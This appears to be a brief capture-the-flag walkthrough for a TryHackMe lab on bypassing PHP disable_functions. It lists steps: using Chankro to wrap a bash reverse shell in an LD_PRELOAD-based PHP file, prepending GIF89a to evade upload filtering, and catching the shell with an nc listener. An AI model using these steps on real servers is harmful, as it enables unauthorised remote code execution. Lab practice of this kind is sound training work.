Hi, today we have Bypass Disable Functions(https://tryhackme.com/room/bypassdisablefunctions)

1.The goal of the room is to gain control through file upload.
2.Essentially, we need to overwrite LD_PRELOAD to change the path to OUR library.
3.We will need to download the CHANKRO tool, which can be done using (git clone https://github.com/TarlogicSecurity/Chankro.git)
4.After downloading, navigate to the Chankro folder using the command cd Chankro.
5.Next, using the command gobuster dir -u http://ip_your_machine -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt, we need to find the phpinfo.php file.
6.Next, open this file on the website and copy the full path, to which we will later append 'uploads' as specified in the task.
7.Create a file using the nano shell.php command, write /bin/bash at the beginning of the file, and then paste the code from revshells.com, where we select bash -i but change sh to bash.
8.Then, using the Chankro tool, we convert our file into a library: python2 chankro.py --arch 64 --input shell.php --output revshell.php --path <DocumentRoot_from_phpinfo.php>/uploads
9.After that, open the newly created file and add GIF89a; to the very first line, right before the opening PHP tags.
10.Next, open port 9001 using nc -lvnp 9001 and upload our newly created file to the website.
11.After establishing the connection, run find / -name 'flag.txt' 2>/dev/null in the command line and get the flag.
12.Completed
